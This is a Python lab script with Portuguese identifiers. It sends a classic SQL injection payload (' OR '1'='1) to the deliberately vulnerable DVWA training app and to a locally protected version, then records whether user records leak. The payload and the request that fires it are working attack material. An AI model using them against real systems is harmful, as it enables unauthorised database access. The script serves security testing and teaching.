"""Compara SQL Injection no DVWA vulnerável e no ambiente protegido local."""
import time

import requests

from common import (dvwa_cookies, dvwa_url, local_url, new_result, print_and_save,
                    profile_args, protected_base_url, selected_profiles)

PAYLOAD = "' OR '1'='1"


def run_vulnerable() -> dict:
    started = time.perf_counter()
    response = requests.get(dvwa_url("DVWA_SQLI_URL", "/vulnerabilities/sqli/"), params={"id": PAYLOAD, "Submit": "Submit"}, cookies=dvwa_cookies(), timeout=10)
    exposed = "First name:" in response.text and "Surname:" in response.text
    return new_result(profile="vulneravel", attack="sql_injection", success=exposed, attempts=1, elapsed=time.perf_counter() - started, status_code=response.status_code, outcome="dados_expostos" if exposed else "payload_sem_efeito")


def run_protected() -> dict:
    started = time.perf_counter()
    response = requests.get(local_url(f"{protected_base_url()}/sqli.php"), params={"id": PAYLOAD}, timeout=10)
    exposed = "Alice Silva" in response.text or "Bruno Souza" in response.text
    return new_result(profile="protegido", attack="sql_injection", success=exposed, attempts=1, elapsed=time.perf_counter() - started, status_code=response.status_code, outcome="dados_expostos" if exposed else "entrada_rejeitada_por_validacao")


def main() -> None:
    args = profile_args(__doc__ or "Teste de SQL Injection")
    for profile in selected_profiles(args.perfil):
        try:
            result = run_vulnerable() if profile == "vulneravel" else run_protected()
        except (requests.RequestException, ValueError) as error:
            result = new_result(profile=profile, attack="sql_injection", success=False, attempts=0, elapsed=0, status_code=None, outcome="erro_de_execucao", erro=str(error))
        print_and_save(result)


if __name__ == "__main__":
    main()
